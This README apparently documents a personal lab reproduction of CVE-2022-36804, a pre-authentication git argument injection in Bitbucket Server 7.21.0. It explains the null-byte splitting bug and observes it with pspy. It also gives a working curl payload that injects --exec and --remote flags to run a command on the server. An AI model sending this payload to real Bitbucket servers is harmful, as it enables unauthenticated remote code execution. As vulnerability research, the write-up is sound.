# Docker container to investigate CVE-2022-36804
*Recreating remote code execution vulnerability where Bitbucket fails to sanitize user input, which allows attackers to inject Git flags and execute code remotely.*

This repository documents how I reproduced the vulnerability CVE-2022-36804, an issue with pre-authentication argument injection in Bitbucket Server. The goal was to demonstrate the underlying security issue as described in Assetnote's public writeup. All testing was performed in an isolated local environment. 

## Overview
CVE-2022-36804 is caused by Bitbucket passing user input directly into a git archive subprocess without sanitizing null bytes. Because Bitbucket uses NuProcess to spawn git, null bytes are preserved and cause argument splitting. This allows an attacker to inject extra git flags into the command. In vulnerable versions (such as 7.21.0 as used in this setup) this leads to remote code execution without authentication.

## Lab setup
- Bitbucket version 7.21.0
- Deployment: Docker Compose 
- Repository: public test repo ('TEST/demo')
- Host: local isolated lab environment

To start the environment:
~~~
docker compose up -d
~~~

Verify version: 
~~~
cat /opt/atlassian/bitbucket/VERSION
~~~

## Demonstrating the vulnerability 


The key to this CVE is showing that a null byte in the `prefix` parameter causes Bitbucket to pass multiple arguments to `git archive`. 

1. Run pspy inside the Bitbucket container

~~~
docker exec -it bitbucket bash
cd /tmp
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
~~~
Leave pspy running. 

2. Trigger the vulnerable endpoint from host: 
~~~
curl "http://localhost:7990/rest/api/latest/projects/TEST/repos/demo/archive?prefix=test%00canary&format=zip"
~~~
This tests if the null byte causes argument splitting.

3. Observe the injected arguments
In pspy Bitbucket generates:
~~~
/usr/bin/git archive --format=zip --prefix=test canary/ -- 
~~~
Here `test` and `canary` show up as separate arguments instead of one. The `%00` split the input and Bitbucket is forced to pass them as independent arguments to git. 

The image below shows how pspy running inside the Bitbucket Docker container catching ` /usr/bin/git archive --format=zip --prefix=test canary/ -- ` (PID=666). What was sent as one value - ` test%00canary ` - is passed as two separate arguments. The null byte split the input which sneaks an extra argument into the git command.

<img width="1870" height="792" alt="Skärmbild 2026-03-30 191936" src="https://github.com/user-attachments/assets/860fa4b1-5b73-47f8-9afc-14f6f201b882" />


4. Full RCE proof:

By injecting `--exec=touch /tmp/pwned` and `--remote=file:///...` via null bytes the server executes an arbitrary command. Even though git exits with code 128, the command runs before git gives the error and `/tmp/pwned` is created inside the container.
   Payload:
~~~
curl "http://localhost:7990/rest/api/latest/projects/TEST/repos/DEMO/archive?at=ebbabd99dd2da7bb5f8ed6dea8c988253fb43260&prefix=x%00--exec=touch+/tmp/pwned%00--remote=file:///var/atlassian/application-data/bitbucket/shared/data/repositories/1%00x&format=zip"   
~~~

The image below shows pspy catching the full execution chain - `/usr/bin/git archive` running with `--exec` and `--remote` arguments (PID=74412), spawning `/bin/sh` `touch /tmp/pwned` (PID=74413)
<img width="2820" height="100" alt="Skärmbild 2026-04-12 165103" src="https://github.com/user-attachments/assets/99eb37aa-01f4-409a-9e9a-71d430bdd22e" />

With `docker exec -it bitbucket ls -la /tmp/pwned` it was possible to verify the file was created.
See image below.
<img width="782" height="102" alt="Skärmbild 2026-04-12 164846" src="https://github.com/user-attachments/assets/a69dc09a-b520-4ad4-b96d-46dbac8512c8" />



## References 
* Assetnote: Bitbucket pre-auth rce via git argument injection
  - https://www.assetnote.io/resources/research/breaking-bitbucket-pre-auth-remote-command-execution-cve-2022-36804
* CVE-2022-36804
  - https://nvd.nist.gov/vuln/detail/CVE-2022-36804

## Author
Johan -
Stockholm, Sweden 
